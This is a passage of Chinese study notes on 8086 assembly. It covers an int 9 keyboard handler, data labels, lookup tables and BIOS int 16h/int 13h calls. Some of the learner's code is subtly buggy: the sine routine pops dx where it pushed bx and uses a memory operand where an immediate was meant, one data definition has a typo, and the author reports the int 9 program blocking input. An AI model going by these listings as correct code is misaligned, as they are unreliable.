class="line">mov word ptr es:[9*4],204h</span><br><span class="line">mov word ptr es:[9*4+2],0</span><br><span class="line">sti</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">int9:push ax</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push es</span><br><span class="line">in al,60h</span><br><span class="line">pushf;保存标志寄存器</span><br><span class="line">pushf</span><br><span class="line">pop bx</span><br><span class="line">and bh,11111100b</span><br><span class="line">push bx</span><br><span class="line">popf;修改if和tf  </span><br><span class="line">call dword ptr es:[200h]</span><br><span class="line">cmp al,3bh</span><br><span class="line">jne int9ret</span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,1</span><br><span class="line">mov cx,2000</span><br><span class="line">s:inc byte ptr es:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line">int9ret:pop es</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">pop ax</span><br><span class="line">iret</span><br><span class="line">int9end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>我一运行就不能输入</p><h3 id="指令系统总结"><a href="#指令系统总结" class="headerlink" title="指令系统总结"></a>指令系统总结</h3><p>8086CPU 提供以下几大类指令</p><ol><li><p>数据传送指令<br>比如:mov、push、pop、pushf、popf、xchg等都是数据传送指令，这些指令实现寄存器和内存、寄存器和寄存器之间的单个数据传送</p></li><li><p>算术运算指令<br>比如:add、sub、adc、sbb、inc、dec、cmp、imul、idiv、aaa等都是算术运算指令，这些指令实现寄存器和内存中的数据的算数运算，它们的执行结果影响标志寄存器的:sf、zf、of、cf、pf、af位。</p></li><li><p>逻辑指令</p><p>如:and、or、not、xor、test、shl、shr 、sal、sar、rol、ror、rcl、rcr等都是逻辑指令，除了not指令外，它们的执行结果都影响标志寄存器的相关标志位。</p></li><li><p>转移指令<br>可以修改IP，或同时修改CS 和IP 的指合统称为转移指令。转移指令分为以下几类</p><ol><li>无条件转移指令，比如:jmp</li><li>条件转移指令，比如:jcxz、je、jb、ja、jnb、jna等;</li><li>循环指令，比如:loop;</li><li>过程，比如:call、ret、retf:</li><li>中断，比如int、iret。</li></ol></li><li><p>处理机控制指令<br>这些指令对标志寄存器或其他处理机状态进行设置，比如:cld、std、cli、sti、nop、clc、cmc、stc、hlt、wait、esc、lock等都是处理机控制指令</p></li><li><p>串处理指令<br>这些指令对内存中的批量数据进行处理<br>如:movsb、movsw、cmps、scas、lods、stos等。</p><p>若要使用这些指令方便地进行批量数据的处理，则需要和rep、repe、repne等前缀指令配合使用。</p></li></ol><h2 id="16-直接定址表"><a href="#16-直接定址表" class="headerlink" title="16 直接定址表"></a>16 直接定址表</h2><h3 id="16-1-描述了单元长度的标号"><a href="#16-1-描述了单元长度的标号" class="headerlink" title="16.1 描述了单元长度的标号"></a>16.1 描述了单元长度的标号</h3><p>举例：</p><p>下面的程序将code 段中的a标号处的8个数据累加，结果存储到b标号处的字中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">a: db 1,2,3,4,5,6,7,8</span><br><span class="line">b: dw 0</span><br><span class="line">start:  mov si,offset a</span><br><span class="line">mov bx,offset b</span><br><span class="line">mov cx,8</span><br><span class="line">s:  mov al,cs:[si]</span><br><span class="line">mov ah,0</span><br><span class="line">add cs:[bx],ax</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803031628357.png" alt="image-20240803031628357"></p><p>16进制24，10进制36</p><p>上述程序中所有的标号都只表示内存单元的地址</p><p>但是，我们还可以使用一种标号，这种标号不但表示内存单元的地址，还表示了内存单元的长度，即表示在此标号处的单元，是一个字节单元，还是字单元，还是双字单元。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">start:  mov si,offset a</span><br><span class="line">mov bx,offset b</span><br><span class="line">mov cx,8</span><br><span class="line">s:  mov al,cs:[si]</span><br><span class="line">mov ah,0</span><br><span class="line">add cs:[bx],ax</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><ul><li><p>我们在code 段中使用的标号a、b后面没有 <code>:</code> 因此它们是可以同时描述内存地址和单元长度的标号。</p></li><li><p>标号a描述了地址code:0，和从这个地址开始，以后的内存单元都是字节单元;</p></li><li><p>而标号b描述了地址code:8，和从这个地址开始，以后的内存单元都是字单元。</p></li><li><p>因为这种标号包含了对单元长度的描述，所以在指令中，它可以代表一个段中的内存单元。</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,b 相当于:mov ax,cs:[8]</span><br><span class="line">mov b,2 相当于:mov word ptr cs:[8],2</span><br><span class="line">inc b 相当于:inc word ptr cs:[8]</span><br><span class="line">在这些指令中，标号b代表了一个内存单元，地址为code:8，长度为2 字节。</span><br></pre></td></tr></table></figure><p>对于程序中的a db 1,2,3,4,5,6,7,8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al,a[si]</span><br><span class="line">相当于:mov al,cs:0[si]</span><br><span class="line">mov al,a[3]</span><br><span class="line">相当于:mov al,cs:0[3]</span><br><span class="line">mov al,a[bx+si+3]</span><br><span class="line">相当于:mov al,cs:0[bx+si+3]</span><br></pre></td></tr></table></figure></li><li><p>这种标号我们叫做<strong>数据标号</strong>，他标记了<strong>存储数据的单元的地址和长度</strong></p></li></ul><h3 id="16-2-在其他段中使用数据标号"><a href="#16-2-在其他段中使用数据标号" class="headerlink" title="16.2 在其他段中使用数据标号"></a>16.2 在其他段中使用数据标号</h3><ul><li>一般来说，我们不会在代码段中定义数据，而是将数据定义到其他段中。</li><li>在其他段中，我们也可以使用数据标号来描述存储数据的单元的地址和长度。</li><li>注意:在后面加有 <code>:</code> 的地址标号，只能在代码段中使用，不能在其他段中使用。</li></ul><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data;注意这里定义了ds:data</span><br><span class="line">data segment</span><br><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:  mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:  mov al,a[si]</span><br><span class="line">mov ah,0</span><br><span class="line">add b,ax</span><br><span class="line">inc si</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803033711192.png" alt="image-20240803033711192"></p><p><strong>注意</strong>，如果想在代码段中，直接用数据标号访问数据，则需要用伪指令assume 将标号所在的段和一个段寄存器联系起来，</p><p>否则编译器在编译的时候，无法确定标号的段地址在哪一个寄存器中。</p><p>因为这些实际编译出的指令，都默认所访问单元的段地址在ds中，而实际要访问的段为data，所以，若要访问正确，在这些指会执行前，ds中必须为 data 段的段地址。<br>则，我们在程序中使用指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br></pre></td></tr></table></figure><p>设置ds指向data段。</p><p>我们可以将标号当作数据来定义，此时，编译器将标号所表示的地址当作数据的值。<br>比如 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2 3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dw a,b//offset a,offset b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>数据标号c处存储的两个字型数据为标号a、b的偏移地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2 3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dd a,b//a的段地址和偏移地址,b的段地址和偏移地址</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">a db 1,2 3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br><span class="line">c dw offset a,seg a,offset b,seg b</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><p>seg操作符，功能为取得某一标号的段地址</p><h3 id="16-3-直接定址表"><a href="#16-3-直接定址表" class="headerlink" title="16.3 直接定址表"></a>16.3 直接定址表</h3><p><strong>任务</strong></p><p>编写子程序，以十六进制的形式在屏幕中间显示给定的byte型数据</p><p><strong>分析</strong></p><p>一个字节需要用两个十六进制数码来表示，所以，子程序需要在屏幕上显示两个ASCII 字符。我们当然要用这16个字符来显示十六进制数码我们可以将一个byte的高4位和低4位分开，分别用它们的值得到对应的数码字符。比如2Bh，我们可以得到高4 位的值为2，低4 位的值为11。</p><p>最简单的方法就是一一比较</p><p>但是会很复杂，我们希望的是显然，我们希望能够在数值0<del>15和字符“0”</del>“F”之间找到一种映射关系。这样我们用0<del>15间的任何数值，都可以通过这种映射关系直接得到“0”</del>“F”中对应的字符</p><p>数值0<del>9和字符“0”</del>“9“之间的映射 :</p><ul><li>数值+30h&#x3D;对应字符的ASCII值:</li></ul><p>但是，10<del>15和“A”</del>“F”之间的映射关系是</p><ul><li>数值+37h&#x3D;对应字符的ASCII值</li></ul><p>还是复杂了，我们希望更简单的算法，考虑用同一种映射关系从数值得到字符码</p><p><strong>查表法</strong></p><p><strong>任务一</strong></p><p>具体的做法是，我们建立一张表，表中依次存储字符“0”<del>“F”我们可以通过数值0</del>15直接查找到对应的字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:  mov al,2eh</span><br><span class="line">call showbyte</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">showbyte:jmp short show</span><br><span class="line"> table db &#x27;0123456789ABCDEF&#x27; ;字符表</span><br><span class="line"></span><br><span class="line">show:push bx</span><br><span class="line">push es</span><br><span class="line">mov ah,al</span><br><span class="line">shr ah,1</span><br><span class="line">shr ah,1</span><br><span class="line">shr ah,1;右移4位，ah中得到高4位的值</span><br><span class="line">shr ah,1</span><br><span class="line">and al,00001111b;a1中为低4位的值</span><br><span class="line">mov bl,ah</span><br><span class="line">mov bh,0</span><br><span class="line">mov ah,table[bx];用高4位的值作为相对于 table 的偏移，取得对应的字符</span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov es:[160*12+40*2],ah</span><br><span class="line">mov bl,al</span><br><span class="line">mov bh,0</span><br><span class="line">mov al,table[bx];用低4位的值作为相对于 table 的偏移，取得对应的字符</span><br><span class="line">mov es:[160*12+40*2+2],al</span><br><span class="line">pop es</span><br><span class="line">pop bx</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803200158894.png" alt="image-20240803200158894"></p><ul><li><p>利用表，在两个数据集合之间建立一种映射关系，使我们可以用查表的方法根据给出的数据得到其在另一集合中的对应数据。</p><p>目的</p><ol><li>为了算法清晰简洁</li><li>为了加快运算速度</li><li>为了使程序易于扩充</li></ol></li></ul><p><strong>任务二</strong></p><p>编写一个子程序，计算sin(x)，x属于{0°,30°,60°,90°,120°,150°,180°}，并在屏幕中间显示计算结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:  mov al,30h</span><br><span class="line">call showsin</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">showsin:jmp short show</span><br><span class="line">table dw ag0,ag30,ag60,ag90,ag120,ag150,ag180</span><br><span class="line">ag0 db &#x27;0&#x27;,0</span><br><span class="line">ag30 db &#x27;0.5&#x27;,0</span><br><span class="line">ag60 db &#x27;0.866&#x27;,0</span><br><span class="line">ag90 db &#x27;1&#x27;,0</span><br><span class="line">ag120 db&#x27;0.866&#x27;,0</span><br><span class="line">ag150 db &#x27;0.5&#x27;,0</span><br><span class="line">ag180 db &#x27;0&#x27;,0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show:push bx</span><br><span class="line">push es</span><br><span class="line">push si</span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov ah,0</span><br><span class="line">mov bl,30</span><br><span class="line">div bl</span><br><span class="line">mov bl,al</span><br><span class="line">mov bh,0</span><br><span class="line">add bx,bx;table中每个地址以字型单元的形式存储</span><br><span class="line">mov bx,table[bx];这时bX储存的是字符串的地址</span><br><span class="line">mov si,[160*12+40*2]</span><br><span class="line"></span><br><span class="line">shows:mov ah,cs:[bx]</span><br><span class="line">cmp ah,0;与上一条指令一起判断是否接触到0</span><br><span class="line">je showret;接触到0就跳转退出</span><br><span class="line">mov es:[si],ah;录入显存</span><br><span class="line">inc bx</span><br><span class="line">add si,2;指向下一个字符</span><br><span class="line">jmp short shows</span><br><span class="line">showret:pop si</span><br><span class="line">pop es</span><br><span class="line">pop dx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803202801378.png" alt="image-20240803202801378"></p><h3 id="16-4-程序入口地址的直接定址表"><a href="#16-4-程序入口地址的直接定址表" class="headerlink" title="16.4 程序入口地址的直接定址表"></a>16.4 程序入口地址的直接定址表</h3><p><strong>问题</strong></p><p>实现一个子程序setscreen，为显示输出提供如下功能:</p><ol><li>清屏。</li><li>设置前景色</li><li>设置背景色</li><li>向上滚动一行</li></ol><p>入口参数说明</p><ol><li><p>用ah 寄存器传递功能号<br>-0 表示清屏<br>-1 表示设置前景色<br>-2 表示设置背景色<br>-3 表示向上滚动一行;</p></li><li><p>对于2、3号功能，用al传送颜色值</p><p>(al)&#x3D;{0,1,2,3,4,5,6,7}</p></li></ol><p><strong>1.清屏</strong></p><p>将显存中当前屏幕中的字符设为空格符</p><p>**2.设置前景色 **</p><p>设置显存中当前屏幕中处于奇地址的属性字节的第0、1、2位;</p><p><strong>3.设置背景色</strong></p><p>设置显存中当前屏幕中处于奇地址的属性字节的第4、5、6位;</p><p><strong>4. 向上滚动一行</strong></p><p>依次将第 n+1行的内容复制到第n行处:最后一行为空</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803204647580.png" alt="image-20240803204647580"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803204719251.png" alt="image-20240803204719251"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803204818301.png" alt="image-20240803204818301"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803205000691.png" alt="image-20240803205000691"></p><p>我们可以将这些功能子程序的入口地址存储在一个表中，它们在表中的位置和功能号相对应。</p><p>对应的映射关系为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">功能号*2=对应的功能子程序在地址表中的偏移</span><br></pre></td></tr></table></figure><h2 id="17-使用BOIS进行键盘的输入和磁盘读写"><a href="#17-使用BOIS进行键盘的输入和磁盘读写" class="headerlink" title="17 使用BOIS进行键盘的输入和磁盘读写"></a>17 使用BOIS进行键盘的输入和磁盘读写</h2><p>罗云彬win32</p><p>大多数有用的程序都需要处理用户的输入，键盘输入是最基本的输入。<br>程序和数据通常需要长期存储，磁盘是最常用的存储设备。<br>BIOS 为这两种外设的I&#x2F;O提供了最基本的中断例程，在本章中，我们对它们的应用和相关的问题进行讨论。</p><h3 id="17-1-int-9中断例程对键盘输入的处理"><a href="#17-1-int-9中断例程对键盘输入的处理" class="headerlink" title="17.1 int 9中断例程对键盘输入的处理"></a>17.1 int 9中断例程对键盘输入的处理</h3><ul><li>CPU 在9号中断发生后，执行int 9中断例程，从60h 端口读出扫描码，并将其转化为相应的ASCII 码或状态信息，存储在内存的指定空间(键盘缓冲区或状态字节)中。</li><li>所以，一般的键盘输入，在CPU 执行完int9中断例程后，都放到了键盘缓冲区中。</li><li>键盘缓冲区中有16 个字单元，可以存储15个按键的扫描码和对应的ASCII码。</li></ul><h3 id="17-2-使用int-16H中断例程读取键盘缓冲区"><a href="#17-2-使用int-16H中断例程读取键盘缓冲区" class="headerlink" title="17.2 使用int 16H中断例程读取键盘缓冲区"></a>17.2 使用int 16H中断例程读取键盘缓冲区</h3><ul><li><p>BIOS提供了int 16h 中断例程供程序员调用。</p></li><li><p>int 16h 中断例程中包含的一个最重要的功能是从键盘缓冲区中读取一个键盘输入，该功能的编号为0。</p></li><li><p>下面的指令从键盘缓冲区中读取一个键盘输入并且将其从缓冲区中删除:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,0</span><br><span class="line">int 16H</span><br><span class="line">结果: (ah)=扫描码,(al)=ASCII码</span><br></pre></td></tr></table></figure></li><li><p>int 16H中断程序的0号功能</p><ol><li>检测键盘缓冲区中是否有数据</li><li>没有则继续做第1步;</li><li>读取缓冲区第一个字单元中的键盘输入</li><li>将读取的扫描码送入ah，ASCII码送入a</li><li>将已读取的键盘输入从缓冲区中删除</li></ol></li><li><p>可见，BIOS的int9中断例程和int 16h中断例程是一对相互配合的程序，int 9中断例程向键盘缓冲区中写入，int 16h 中断例程从缓冲区中读出</p></li><li><p>它们写入和读出的时机不同，int9中断例程在有键按下的时候向键盘缓冲区中写入数据;</p></li><li><p>而int 16h 中断例程是在应用程序对其进行调用的时候，将数据从键盘缓冲区中读出。</p></li></ul><p><strong>编程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:  mov ah,0</span><br><span class="line">int 16H</span><br><span class="line">cmp al,&#x27;r&#x27;</span><br><span class="line">jne g</span><br><span class="line">mov al,4</span><br><span class="line">call sub2</span><br><span class="line">jmp over</span><br><span class="line">g:cmp al,&#x27;g&#x27;</span><br><span class="line">jne b</span><br><span class="line">mov al,2</span><br><span class="line">call sub2</span><br><span class="line">jmp over</span><br><span class="line">b:mov al,1</span><br><span class="line">call sub2</span><br><span class="line">jmp over</span><br><span class="line">over:mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sub2:push bx</span><br><span class="line">push cx</span><br><span class="line">push es</span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov bx,1</span><br><span class="line">mov cx,2000</span><br><span class="line">sub2s:and byte ptr es:[bx],11111000b</span><br><span class="line">or es:[bx],al</span><br><span class="line">add bx,2</span><br><span class="line">loop sub2s</span><br><span class="line">pop es</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240803213852879.png" alt="image-20240803213852879"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803213908995.png" alt="image-20240803213908995"></p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240803213923673.png" alt="image-20240803213923673"></p><h3 id="17-3-字符串的输入"><a href="#17-3-字符串的输入" class="headerlink" title="17.3 字符串的输入"></a>17.3 字符串的输入</h3><p>最基本的字符串输入程序，需要具备下面的功能</p><ol><li>在输入的同时需要显示这个字符串;</li><li>一般在输入回车符后，字符串输入结束</li><li>能够删除已经输入的字符。</li></ol><p>对于这三个功能，我们可以想象在DOS中，输入命令行时的情况。</p><p><strong>实现功能所需要的参数</strong></p><ol><li>(dh)、(dl)&#x3D;字符串在屏幕上显示的行、列位置</li><li>ds:si指向字符串的存储空间，字符串以0为结尾符</li></ol><p><strong>分析</strong></p><ol><li><p>字符的输入和删除<br>每个新输入的字符都存储在前一个输入的字符之后，而删除是从最后面的字符进行的。</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803230124088.png" alt="image-20240803230124088"></p><ul><li>可以看出在字符串输入的过程中，字符的输入和输出是按照栈的访问规则进行的，即后进先出。</li><li>这样，我们就可以用栈的方式来管理字符串的存储空间，也就是说，字符串的存储空间实际上是一个字符栈。</li><li>字符栈中的所有字符，从栈底到栈顶，组成一个字符串。</li></ul></li><li><p>在输入回车符后，字符串输入结束。</p><p>输入回车符后，我们可以在字符串中加入0，表示字符串结束。</p></li><li><p>在输入的同时需要显示这个字符串。</p><p>每次有新的字符输入和删除一个字符的时候，都应该重新显示字符串，即从字符栈的栈底到栈顶，显示所有的字符。</p></li><li><p>程序的处理过程。现在我们可以简单地确定程序的处理过程如下:</p><ol><li>调用int 16h读取键盘输入;</li><li>如果是字符，进入字符栈，显示字符栈中的所有字符;继续执行1</li><li>如果是退格键，从字符栈中弹出一个字符，显示字符栈中的所有字符;继续执行1</li><li>如果是Enter 键，向字符栈中压入0，返回</li></ol></li></ol><ul><li>这个程序比较常使用，我们可以将他写成子程序</li></ul><p><strong>子程序</strong></p><p>参数说明：</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803230655212.png" alt="image-20240803230655212"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240803230718374.png" alt="image-20240803230718374"></p><ul><li>可以通过，一段内存表示栈空间和一个内存存储栈顶，来实现一个简单的栈</li></ul><h3 id="17-4-应用int-13h中的中断例程对磁盘进行读写"><a href="#17-4-应用int-13h中的中断例程对磁盘进行读写" class="headerlink" title="17.4 应用int 13h中的中断例程对磁盘进行读写"></a>17.4 应用int 13h中的中断例程对磁盘进行读写</h3><p>以3.5英寸的软盘为例</p><p>常用的3.5英寸的软盘的结构</p><p>分为上下两面，每面有80个磁道，每个磁道又分为18个扇面，每个扇面的大小为512B</p><p>总容量为：<code>2面*80磁道*18扇区*512B=1440KB约等于1.44MB</code></p><p>磁盘的实际访问由磁盘控制器进行，我们可以通过控制磁盘控制器来访问磁盘。</p><p>注意，我们只能以扇区为单付对磁盘进行读写在读写扇区的时候，要给出面号、磁道号和扇区号。面号和磁道号从0开始，而扇区号从1开始</p><p>BIOS提供了对扇区进行读写的中断例程，这些中断例程完成了许多复杂的和便件相关的工作。</p><p>我们可以通过调用BIOS中断例程来访问磁盘:</p><p>BOIS提供的访问磁盘的中断例程为int 13H</p><p><strong>演示</strong></p><p>读取0面0道1扇面的内容到0:200</p><ol><li><p><strong>入口参数</strong></p><ul><li>(ah)&#x3D;int 13h的功能号(2表示读扇区)</li><li>(al)&#x3D;读取的扇区数</li><li>(ch)&#x3D;磁道号</li><li>(cl)&#x3D;扇区号</li><li>(dh)&#x3D;磁头号(对于软驱即面号，因为一个面用一个磁头来读写)</li><li>(dl)&#x3D;驱动器号<ul><li>软驱从0开始，0:软驱A，1:软驱B</li><li>硬盘从80h开始，80h:硬盘C，81h:硬盘D</li></ul></li><li>es:bx指向接收此扇区读入数据的内存区</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,200h</span><br><span class="line">mov al,1</span><br><span class="line">mov ch,0</span><br><span class="line">mov cl,1</span><br><span class="line">mov dl,0</span><br><span class="line">mov dh,0</span><br><span class="line">mov ah,2</span><br><span class="line">int 